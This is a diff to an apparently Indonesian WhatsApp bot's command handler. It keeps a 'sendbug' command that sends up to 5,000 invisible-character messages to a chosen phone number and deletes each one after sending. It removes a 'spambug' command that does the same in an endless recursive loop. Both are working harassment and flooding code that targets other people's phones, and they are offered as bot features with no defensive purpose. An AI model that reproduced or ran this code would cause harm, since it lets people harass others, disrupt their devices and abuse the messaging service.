@@ -142,31 +142,14 @@ if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim b
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
 nd = dn.split("|")
 if (!nd) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
-if (Number(nd[1]) >= 10000) return reply('Jumlah terlalu banyak!')
+if (Number(nd[1]) >= 5000) return reply('Jumlah terlalu banyak!')
 if (!Number(nd[1])) return reply('Jumlah harus berupa angka!')
 for (let i = 0; i < nd[1]; i++){
-await sleep(10000)
+await sleep(5000)
 let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "‎" })
 await sleep(1000)
 semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
 reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
-break
-
-//©from: dennis × ivan
-case 'spambug':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
-if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}spambug ${senderNumber}`)
-if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
-if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
-if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
-if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
-async function infiniteSpam(i) { 
-let spambug = await semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" })
-await sleep(1000)
-semar.sendMessage(`${dn}@s.whatsapp.net`, { delete: spambug.key })
-infiniteSpam(++i)}
-infiniteSpam(1)
-reply(`Sukses spam bug ke nomor ${dn}`)
 break
 
 //©from: dennis × andik
